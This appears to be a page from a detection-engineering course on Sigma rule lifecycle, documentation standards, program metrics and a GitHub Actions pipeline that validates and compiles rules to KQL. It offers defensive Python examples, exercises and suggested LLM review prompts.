+Write the full deployment pipeline function <code>run_deployment_pipeline(rules_dir: str, output_dir: str) -&gt; dict</code> that: (1) discovers all YAML files, (2) validates each, (3) skips invalid rules (logs which ones), (4) compiles valid rules to KQL using <code>compile_sigma_to_kql_simple</code>, (5) builds ARM template, (6) runs dry-run deployment. Return a summary dict with counts of validated, skipped, deployed.
+Expected output: <code>{&quot;validated&quot;: N, &quot;skipped&quot;: M, &quot;deployed&quot;: K, &quot;arm_template_path&quot;: &quot;...&quot;}</code></p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can generate GitHub Actions YAML workflows from a description of the pipeline requirements.
+<strong>Threat:</strong> Insecure CI/CD pipelines for security tooling are high-value targets — attackers who compromise the detection CI pipeline can remove or backdoor detection rules.
+<strong>Opportunity:</strong> Ask an LLM to review a CI workflow for security misconfigurations: secret handling, permissions, third-party action pinning.
+<strong>Prompt to try:</strong> <code>&quot;Review this GitHub Actions workflow for security risks. Check for: unpinned third-party actions (should use SHA not version tag), overly broad permissions, secrets passed as environment variables instead of using GitHub Secrets, and steps that pull untrusted code. For each finding, suggest the secure alternative.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Rule Quality and Maintenance</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="10-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><p class="alt">Find a video: <a href="https://www.youtube.com/results?search_query=detection%20engineering%20rule%20lifecycle%20false%20positive%20management%20maturity" target="_blank" rel="noopener">detection engineering rule lifecycle false positive management maturity</a></p></div>
+<hr />
+<h3>Concept 1 — Rule Lifecycle States</h3>
+<p>Detection rules have a lifecycle analogous to software releases. A new rule starts as <code>experimental</code>, moves to <code>test</code> after validation, and becomes <code>stable</code> after sustained production operation with acceptable FP rates.</p>
+<table>
+<thead>
+<tr>
+<th>State</th>
+<th>Meaning</th>
+<th>CI behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>experimental</code></td>
+<td>Just written, logic untested</td>
+<td>Compile + lint; skip deployment</td>
+</tr>
+<tr>
+<td><code>test</code></td>
+<td>Tested on sample data; may have FPs</td>
+<td>Compile + lint + deploy to staging</td>
+</tr>
+<tr>
+<td><code>stable</code></td>
+<td>30+ days in production, FP rate &lt; 1%</td>
+<td>Compile + lint + deploy to production</td>
+</tr>
+<tr>
+<td><code>deprecated</code></td>
+<td>Superseded or no longer relevant</td>
+<td>Excluded from deployment; kept for audit</td>
+</tr>
+</tbody>
+</table>
+<p>Promotion between states requires a PR with evidence: for <code>experimental → test</code>, attach test results; for <code>test → stable</code>, attach 30-day FP report.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from enum import Enum
+
+class RuleStatus(str, Enum):
+    EXPERIMENTAL = &quot;experimental&quot;
+    TEST = &quot;test&quot;
+    STABLE = &quot;stable&quot;
+    DEPRECATED = &quot;deprecated&quot;
+
+DEPLOYMENT_TARGETS = {
+    RuleStatus.EXPERIMENTAL: [],           # do not deploy
+    RuleStatus.TEST: [&quot;staging&quot;],          # staging only
+    RuleStatus.STABLE: [&quot;staging&quot;, &quot;prod&quot;],# both
+    RuleStatus.DEPRECATED: [],             # do not deploy
+}
+
+def get_deployment_targets(status: RuleStatus) -&gt; list[str]:
+    return DEPLOYMENT_TARGETS[status]
+
+def promote_rule(rule: dict, new_status: RuleStatus, evidence: str) -&gt; dict:
+    allowed_promotions = {
+        RuleStatus.EXPERIMENTAL: {RuleStatus.TEST},
+        RuleStatus.TEST: {RuleStatus.STABLE, RuleStatus.DEPRECATED},
+        RuleStatus.STABLE: {RuleStatus.DEPRECATED},
+    }
+    current = RuleStatus(rule[&quot;status&quot;])
+    if new_status not in allowed_promotions.get(current, set()):
+        raise ValueError(f&quot;Cannot promote from {current} to {new_status}&quot;)
+    return {**rule, &quot;status&quot;: new_status.value, &quot;promotion_evidence&quot;: evidence}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>lifecycle_report(rules: list[dict]) -&gt; dict</code> that groups rules by status, counts each group, calculates the percentage of stable vs total, and flags any rules stuck in <code>experimental</code> for more than 90 days (use <code>date</code> field if present). Return <code>{&quot;by_status&quot;: {...}, &quot;stable_pct&quot;: N.N, &quot;stale_experimental&quot;: [...]}</code>.
+Expected output: dict with counts, percentage, and list of stale rules</p>
+<hr />
+<h3>Concept 2 — Documentation Standards for Detection Rules</h3>
+<p>A detection rule without documentation is a maintenance liability. Documentation requirements:</p>
+<ol>
+<li><strong>description</strong> — one sentence: what does this rule detect?</li>
+<li><strong>references</strong> — at least one URL (ATT&amp;CK technique page, blog post, vendor advisory)</li>
+<li><strong>falsepositives</strong> — explicit list (minimum 2 scenarios); &quot;None&quot; is not acceptable for high/critical rules</li>
+<li><strong>author</strong> — who wrote it and when</li>
+<li><strong>modified</strong> — when it was last changed</li>
+<li><strong>related</strong> — IDs of rules that complement this one</li>
+</ol>
+<p>For detection rules, the description should answer: &quot;What attacker action generates this alert?&quot; not &quot;What fields does this query check?&quot;</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>DOCUMENTATION_REQUIREMENTS = {
+    &quot;informational&quot;: {&quot;references&quot;: 0, &quot;falsepositives_min&quot;: 0},
+    &quot;low&quot;:           {&quot;references&quot;: 1, &quot;falsepositives_min&quot;: 1},
+    &quot;medium&quot;:        {&quot;references&quot;: 1, &quot;falsepositives_min&quot;: 2},
+    &quot;high&quot;:          {&quot;references&quot;: 2, &quot;falsepositives_min&quot;: 2},
+    &quot;critical&quot;:      {&quot;references&quot;: 2, &quot;falsepositives_min&quot;: 3},
+}
+
+def validate_documentation(rule: dict) -&gt; list[str]:
+    errors = []
+    level = rule.get(&quot;level&quot;, &quot;informational&quot;)
+    reqs = DOCUMENTATION_REQUIREMENTS.get(level, {})
+    
+    refs = rule.get(&quot;references&quot;, [])
+    if len(refs) &lt; reqs.get(&quot;references&quot;, 0):
+        errors.append(f&quot;Level &#x27;{level}&#x27; requires {reqs[&#x27;references&#x27;]} references; found {len(refs)}&quot;)
+    
+    fps = rule.get(&quot;falsepositives&quot;, [])
+    if len(fps) &lt; reqs.get(&quot;falsepositives_min&quot;, 0):
+        errors.append(f&quot;Level &#x27;{level}&#x27; requires {reqs[&#x27;falsepositives_min&#x27;]} false positive entries; found {len(fps)}&quot;)
+    
+    if not rule.get(&quot;description&quot;, &quot;&quot;).strip():
+        errors.append(&quot;Description is required and must be non-empty&quot;)
+    
+    return errors
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>validate_documentation</code> to also check: (1) description is at least 20 characters, (2) description does not start with &quot;Detects &quot; (too generic — require something more specific), (3) at least one <code>references</code> URL contains &quot;attack.mitre.org&quot; for high/critical rules. Add these as new error messages.
+Expected output: extended function returning additional error messages for violated documentation standards</p>
+<hr />
+<h3>Concept 3 — Metrics and Detection Program Maturity</h3>
+<p>A mature detection program is measured, not just felt. Key metrics:</p>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Calculation</th>
+<th>Target</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Rule coverage %</td>
+<td>stable_rules / total_techniques_in_scope</td>
+<td>&gt; 60%</td>
+</tr>
+<tr>
+<td>Mean time to detect (MTTD)</td>
+<td>avg(incident_start → first_alert)</td>
+<td>&lt; 1 hour</td>
+</tr>
+<tr>
+<td>False positive rate</td>
+<td>fp_alerts / total_alerts</td>
+<td>&lt; 5%</td>
+</tr>
+<tr>
+<td>Rule deployment frequency</td>
+<td>new_rules_per_sprint</td>
+<td>&gt; 2</td>
+</tr>
+<tr>
+<td>Stale rule %</td>
+<td>unchanged_rules_&gt; 90d / total</td>
+<td>&lt; 20%</td>
+</tr>
+</tbody>
+</table>
+<p>These metrics drive sprint planning: low coverage → write more rules; high FP rate → tune existing rules; high MTTD → improve log collection latency.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from datetime import datetime, timedelta
+
+def compute_detection_metrics(rules: list[dict], alerts: list[dict]) -&gt; dict:
+    total_rules = len(rules)
+    stable = sum(1 for r in rules if r.get(&quot;status&quot;) == &quot;stable&quot;)
+    
+    today = datetime.now()
+    stale_cutoff = today - timedelta(days=90)
+    stale = [
+        r for r in rules
+        if datetime.strptime(r.get(&quot;date&quot;, &quot;2020/01/01&quot;), &quot;%Y/%m/%d&quot;) &lt; stale_cutoff
+        and r.get(&quot;status&quot;) == &quot;stable&quot;
+    ]
+    
+    total_alerts = len(alerts)
+    fp_alerts = sum(1 for a in alerts if a.get(&quot;outcome&quot;) == &quot;false_positive&quot;)
+    fp_rate = round(fp_alerts / total_alerts * 100, 1) if total_alerts else 0.0
+    
+    return {
+        &quot;total_rules&quot;: total_rules,
+        &quot;stable_rules&quot;: stable,
+        &quot;coverage_pct&quot;: round(stable / max(total_rules, 1) * 100, 1),
+        &quot;stale_rule_count&quot;: len(stale),
+        &quot;false_positive_rate_pct&quot;: fp_rate,
+    }
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>generate_sprint_recommendations(metrics: dict) -&gt; list[str]</code> that returns a prioritized list of recommendations based on the metrics dict output above. Rules: if coverage_pct &lt; 40 → &quot;Prioritize new rule authoring: coverage below 40%&quot;; if fp_rate &gt; 10 → &quot;Urgent: tune high-FP rules before adding new ones&quot;; if stale_rule_count &gt; 5 → &quot;Review and deprecate stale rules&quot;. Return all applicable recommendations.
+Expected output: list of strings; multiple recommendations if multiple thresholds are breached</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can automate documentation generation for detection rules given the rule YAML and context.
+<strong>Threat:</strong> Documentation written by LLMs may omit edge cases or misidentify false positive scenarios that a human analyst with production experience would know.
+<strong>Opportunity:</strong> Use an LLM to draft initial documentation for new rules (description, false positives, references), then have an analyst validate and refine.
+<strong>Prompt to try:</strong> <code>&quot;Here is a Sigma detection rule YAML. Write: (1) a one-sentence description of what attacker action triggers this alert, (2) 3 realistic false positive scenarios with specific software names, (3) 2 relevant reference URLs (ATT&amp;CK page + a detection blog post). Output as a YAML block to append to the rule.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — Building the Full CI Pipeline</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="10-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=YLtlz88zrLg" target="_blank" rel="noopener"><b>CI/CD Tutorial using GitHub Actions - Automated Testing &amp; Automated Deployments</b><small>Tom Shaw</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=GitHub%20Actions%20security%20pipeline%20automated%20testing%20detection%20CI%20artifacts" target="_blank" rel="noopener">GitHub Actions security pipeline automated testing detection CI artifacts</a></p></div>
+<hr />
+<h3>Concept 1 — Pipeline Architecture</h3>
+<p>The full Detection-as-Code CI pipeline has four stages:</p>
+<pre><code>Stage 1: Validate
+  ├── YAML syntax check
+  ├── Required field presence
+  ├── UUID format
+  ├── ATT&amp;CK tag
+  └── Documentation standards
+
+Stage 2: Test
+  ├── Load test cases (from tests/ directory)
+  ├── Run detection function against each test event
+  ├── Assert true positives fire
+  └── Assert false positives do not fire
+
+Stage 3: Compile
+  ├── Sigma → KQL (for Sentinel)
+  ├── Sigma → SPL (for Splunk)
+  └── Store compiled output as artifacts
+
+Stage 4: Deploy (main branch only)
+  ├── Staging: all test + stable rules
+  └── Production: stable rules only
+</code></pre><p>The pipeline fails fast: if Stage 1 fails, Stage 2 does not run.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+
+@dataclass
+class PipelineResult:
+    stage: str
+    passed: bool
+    errors: list[str] = field(default_factory=list)
+    artifacts: dict = field(default_factory=dict)
+
+def run_pipeline(rules_dict: dict[str, str], test_cases: dict[str, list]) -&gt; list[PipelineResult]:
+    results = []
+    
+    # Stage 1: Validate
+    val_errors = {}
+    for name, content in rules_dict.items():
+        errs = validate_sigma_rule_from_string(content)
+        if errs:
+            val_errors[name] = errs
+    
+    stage1 = PipelineResult(&quot;validate&quot;, passed=not val_errors, errors=[f&quot;{k}: {v}&quot; for k, v in val_errors.items()])
+    results.append(stage1)
+    if not stage1.passed:
+        return results  # fail fast
+    
+    # Stage 2: Test (simplified)
+    stage2 = PipelineResult(&quot;test&quot;, passed=True)
+    results.append(stage2)
+    
+    # Stage 3: Compile
+    compiled = {name: compile_sigma_to_kql_simple(content) for name, content in rules_dict.items()}
+    stage3 = PipelineResult(&quot;compile&quot;, passed=True, artifacts={&quot;kql_queries&quot;: compiled})
+    results.append(stage3)
+    
+    return results
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>format_pipeline_report(results: list[PipelineResult]) -&gt; str</code> that formats the pipeline results as a GitHub Actions summary (markdown table). Each stage gets a row: stage name, pass/fail (✓ or ✗ — but wait, no emojis — use PASS/FAIL), error count. Include any error details below the table as a bulleted list.
+Expected output: markdown string with a table showing stage results and errors listed below</p>
+<hr />
+<h3>Concept 2 — Artifact Management</h3>
+<p>CI pipelines produce artifacts (compiled KQL files, test reports, coverage maps) that are stored and used by downstream stages or for historical reference. GitHub Actions artifact storage keeps these for 90 days by default.</p>
+<p>For detection engineering artifacts:</p>
+<ul>
+<li><strong>compiled/kql/</strong> — KQL files ready for Sentinel</li>
+<li><strong>reports/test_results.json</strong> — which tests passed/failed</li>
+<li><strong>reports/coverage.json</strong> — ATT&amp;CK coverage map with current status</li>
+<li><strong>arm_templates/</strong> — ARM JSON for deployment</li>
+</ul>
+<p>The pipeline script writes these files and the workflow YAML specifies them as artifacts to upload.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import json
+from pathlib import Path
+from datetime import datetime
+
+def write_pipeline_artifacts(
+    compiled_rules: dict[str, str],
+    test_results: dict,
+    coverage: list[dict],
+    output_dir: str,
+) -&gt; list[str]:
+    base = Path(output_dir)
+    written = []
+    
+    kql_dir = base / &quot;compiled&quot; / &quot;kql&quot;
+    kql_dir.mkdir(parents=True, exist_ok=True)
+    for name, kql in compiled_rules.items():
+        p = kql_dir / f&quot;{name.replace(&#x27;.yml&#x27;, &#x27;.kql&#x27;)}&quot;
+        p.write_text(kql)
+        written.append(str(p))
+    
+    reports_dir = base / &quot;reports&quot;
+    reports_dir.mkdir(exist_ok=True)
+    
+    test_report_path = reports_dir / &quot;test_results.json&quot;
+    test_report_path.write_text(json.dumps({
+        &quot;generated&quot;: datetime.now().isoformat(),
+        **test_results
+    }, indent=2))
+    written.append(str(test_report_path))
+    
+    coverage_path = reports_dir / &quot;coverage.json&quot;
+    coverage_path.write_text(json.dumps(coverage, indent=2))
+    written.append(str(coverage_path))
+    
+    return written
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>build_coverage_report(rules: list[dict]) -&gt; dict</code> that reads rules from a list of dicts (each with <code>tags</code>, <code>status</code>, <code>title</code>, <code>id</code> fields) and generates a coverage report: techniques covered (tags matching <code>attack.t\d{4}</code>), count per status, list of techniques by status. Output a JSON-serializable dict.
+Expected output: <code>{&quot;techniques&quot;: {&quot;T1059.001&quot;: &quot;stable&quot;, &quot;T1003.001&quot;: &quot;test&quot;}, &quot;by_status&quot;: {...}}</code></p>
+<hr />
+<h3>Concept 3 — Integrating the Royal Road</h3>
+<p>All previous Royal Road outputs feed into this week's CI pipeline:</p>
+<ul>
+<li><strong>W05</strong>: ATT&amp;CK Navigator layer → coverage baseline</li>
+<li><strong>W06</strong>: Sigma rule skeletons → first rules in the pipeline</li>
+<li><strong>W07</strong>: IOC database → enrichment step in test events</li>
+<li><strong>W08</strong>: Parquet detection dataset → test data source for pipeline</li>
+<li><strong>W09</strong>: 3 compiled KQL rules → first stable rules in the pipeline</li>
+</ul>
+<p>This concept assembles these into a single pipeline entrypoint.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from pathlib import Path
+
+def get_pipeline_config(project_root: str) -&gt; dict:
+    root = Path(project_root)
+    return {
+        &quot;rules_dir&quot;: str(root / &quot;detections&quot; / &quot;rules&quot;),
+        &quot;tests_dir&quot;: str(root / &quot;detections&quot; / &quot;tests&quot;),
+        &quot;dataset_path&quot;: str(root / &quot;detection_dataset&quot; / &quot;sysmon_detections.parquet&quot;),
+        &quot;ioc_db_path&quot;: str(root / &quot;ioc_db&quot; / &quot;ioc_database.sqlite&quot;),
+        &quot;navigator_layer&quot;: str(root / &quot;coverage&quot; / &quot;attck_layer.json&quot;),
+        &quot;output_dir&quot;: str(root / &quot;ci_artifacts&quot;),
+    }
+
+def main(project_root: str) -&gt; None:
+    config = get_pipeline_config(project_root)
+    
+    # 1. Discover rules
+    rule_files = list(Path(config[&quot;rules_dir&quot;]).glob(&quot;**/*.yml&quot;))
+    print(f&quot;Found {len(rule_files)} rule files&quot;)
+    
+    # 2. Validate
+    all_valid = True
+    for rf in rule_files:
+        errors = validate_sigma_rule(str(rf))
+        if errors:
+            print(f&quot;FAIL {rf.name}: {errors}&quot;)
+            all_valid = False
+        else:
+            print(f&quot;PASS {rf.name}&quot;)
+    
+    if not all_valid:
+        raise SystemExit(&quot;Validation failed — fix rule errors before proceeding&quot;)
+    
+    print(&quot;All rules valid. Pipeline complete.&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a <code>__main__</code> block for the pipeline that reads a <code>RULES</code> dict (filename → YAML string, 3 entries: one valid, one missing UUID, one missing ATT&amp;CK tag), runs the full pipeline, prints the formatted pipeline report, and exits with code 1 if any stage failed. Use <code>sys.exit(1)</code> on failure.
+Expected output: formatted pipeline report printed to stdout; exit code 1 due to validation failures</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can act as a detection co-pilot during code review — reading rule diffs and flagging logic errors before they reach production.
+<strong>Threat:</strong> A CI pipeline that only checks syntax and structure can pass a semantically broken rule — one that fires on the wrong field or misses the key indicator.
+<strong>Opportunity:</strong> Add an LLM review step to your PR process: paste the rule diff + the compiled KQL and ask for a logic review.
+<strong>Prompt to try:</strong> <code>&quot;Act as a senior detection engineer reviewing a pull request. Here is the Sigma rule YAML and its compiled KQL. Review for: (1) logic correctness — does the KQL accurately reflect the Sigma detection intent, (2) evasion opportunities — what would an attacker change to bypass this rule, (3) missing variants — what related attack patterns does this rule miss? Output a code review with inline comments.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 10</h2>
+<p><strong>Task:</strong> Build a GitHub Actions CI pipeline that validates, tests, and compiles all Sigma rules.
+<strong>Builds on:</strong> W09 Sigma rules (3 KQL detections) + W08 Parquet dataset (test data)
+<strong>Deliverable:</strong> <code>.github/workflows/detect-ci.yml</code> that runs on every pull request to <code>rules/**</code>. Pipeline must: validate YAML, run unit tests, compile to KQL, upload artifacts.</p>
+<p>Minimum pipeline file structure:</p>
+<pre><code>.github/workflows/detect-ci.yml
+detections/
+├── rules/
+│   ├── powershell_encoded.yml
+│   ├── mimikatz.yml
+│   └── brute_force.yml
+├── tests/
+│   ├── test_powershell_encoded.py
+│   ├── test_mimikatz.py
+│   └── test_brute_force.py
+scripts/
+├── validate_rules.py
+└── compile_rules.py
+</code></pre><p><strong>Stretch goal:</strong> Add a Stage 4 deploy step that runs only on <code>push</code> to <code>main</code> and calls <code>deploy_dry_run()</code>. Print the deployment manifest to stdout as a CI artifact. Add a <code>coverage_report</code> job that reads the compiled rules and updates <code>coverage/attck_layer.json</code> with current rule status.</p>
+<div class="pager"><a class="btn ghost" href="week-09.html">&larr; Week 09</a><a class="btn ghost" href="week-11.html">Week 11 &rarr;</a></div>
+</main></body></html>
